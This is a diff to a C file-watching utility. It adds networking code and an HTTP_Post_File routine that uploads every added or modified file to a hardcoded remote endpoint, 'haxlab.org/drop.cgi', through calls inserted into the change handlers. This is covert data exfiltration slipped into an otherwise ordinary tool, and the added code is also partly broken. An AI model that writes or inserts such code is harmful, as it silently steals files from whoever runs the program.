@@ -43,10 +43,18 @@ port it over for you later on."
 #include <time.h>
 #include <sys/stat.h>
 #include <unistd.h>
-
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/stat.h>
 #ifndef PATH_MAX
 #define PATH_MAX 4096
 #endif
+
+#define h_addr h_addr_list[0]
+/* Let's do a HTTP POST to a web-server and retrieve a URL.
+*/
 
 #ifndef strlcpy
 size_t strlcpy(char *d, char const *s, size_t n)
@@ -62,6 +70,7 @@ size_t strlcat(char *d, char const *s, size_t n)
 
 bool debugging = false;
 
+
 void Error(char *fmt, ...)
 {
         char message[8192] = { 0 };
@@ -75,7 +84,108 @@ void Error(char *fmt, ...)
         exit(EXIT_FAILURE);
 }
 
+int Connect(char *hostname, int port)
+{
+    int sock;
+    struct hostent *host;
+    struct sockaddr_in host_addr;
+    
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0)
+    {
+            Error("socket()");
+    }
+    
+    host = gethostbyname(hostname);
+    if (host == NULL)
+    {
+        Error("gethostbyname()");
+    }
+    
+    host_addr.sin_family = AF_INET;
+    host_addr.sin_port = htons(port);
+    host_addr.sin_addr = *((struct in_addr *) host->h_addr);
+    memset(&host_addr.sin_zero, 0, 8);
+    
+    int status = connect(sock, (struct sockaddr *) &host_addr,
+                    sizeof(struct sockaddr));
+                    
+    if (status == 0)
+    {
+        return sock;
+    }
+    
+    return 0;
+}
 
+#define REMOTE_URL "http://haxlab.org/drop.cgi"
+#define REMOTE_HOST "haxlab.org"
+#define REMOTE_PORT 80
+
+bool HTTP_Post_File(char *path)
+{
+    int sock = Connect(REMOTE_HOST, REMOTE_PORT);
+    if (! sock)
+    {
+        Error("Could not Connect()");
+    }
+    
+    struct stat fstats;
+    if (strlen(path) == 0)
+    {
+        return false;
+    }
+    
+    if (stat(path, &fstats) < 0)
+    {
+        return false;
+    }
+    
+    FILE *f = fopen(path, "rb");
+    if (f == NULL)
+    {
+        Error("Unable to open filename %s, this should not happen!", path);
+    }
+#define CHUNK 1024
+
+    char buf[CHUNK + 1] = { 0 };
+    
+    int size = fstats.st_size;
+    int total = 0;
+    
+    char method[1024] = { 0 };
+    snprintf(method, sizeof(method), "POST %s HTTP/1.1\r\n", REMOTE_URL);
+    char host[1024] = { 0 };
+    snprintf(host, sizeof(host),"Host: %s\r\n", REMOTE_HOST);
+    
+    write(sock, method, strlen(method));
+    write(sock, host, strlen(host));
+    
+    char content_length[1024] = { 0 };
+    snprintf(content_length, size, "Content-Length: %d\r\n\r\n", size);
+    
+    while (size)
+    {
+        while (1)
+        {
+            int count = fread(buf, 1, CHUNK, f);
+            int bytes = write(sock, buf, count);
+            if (bytes == 0)
+            {
+                break;
+            }
+            else
+            {
+                size -= bytes;
+                total += bytes;
+            }
+        }
+    }
+    
+    close(sock);
+    
+    return true;
+}
 typedef struct File_t File_t;
 struct File_t {
 	char path[PATH_MAX];
@@ -241,6 +351,7 @@ bool ActOnFileMod(File_t *first, File_t *second)
 			if (c->size != exists->size)
 			{
 				printf("mod file %s\n", c->path);
+                HTTP_Post_File(c->path);
 				isChanged = true;
 			}
 		}
@@ -262,6 +373,7 @@ bool ActOnFileAdd(File_t *first, File_t *second)
 		if (!exists)
 		{
 			printf("add file %s\n", f->path);
+            HTTP_Post_File(f->path);
 			isChanged = true;
 		}	
 	
